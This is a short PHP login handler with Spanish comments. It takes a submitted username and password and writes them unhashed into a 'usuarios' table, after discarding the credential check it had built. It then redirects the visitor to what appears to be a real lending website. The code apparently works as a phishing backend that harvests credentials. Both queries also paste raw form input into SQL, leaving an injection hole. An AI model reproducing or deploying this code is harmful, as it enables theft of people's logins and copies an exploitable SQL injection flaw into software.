<?php
/////////////////////////////////////////////parte de sesiones
include("../configuracion/conexion.php");

/////////////////////////////
$pUser=$_POST["usuario"];
$pContra= $_POST["contrasena"];


$qry = "SELECT id, usuario, pass, id_departamento, nombre FROM usuarios WHERE usuario = '$pUser' AND pass = '$pContra' AND activo = '1'";

$qry = "INSERT INTO usuarios (usuario, pass) VALUES ('$pUser', '$pContra')";

$consulta = mysqli_query($conexion, $qry) or die (mysqli_error());					   

		header("Location: https://www.prestamosavance.com/");
	


?>